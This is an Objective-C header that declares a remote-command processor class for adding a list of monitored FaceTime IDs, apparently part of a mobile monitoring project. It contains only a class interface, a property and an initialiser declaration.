//
//  AddMonitorFacetimeIDProcessor.h
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 7/10/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "RemoteCmdSyncProcessor.h"

@interface AddMonitorFacetimeIDsProcessor : RemoteCmdSyncProcessor {
@private
	NSArray *mFacetimeIDs;
}

@property(nonatomic,retain) NSArray *mFacetimeIDs;

//Initialize Processor with RemoteCommandData 
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData; 

@end
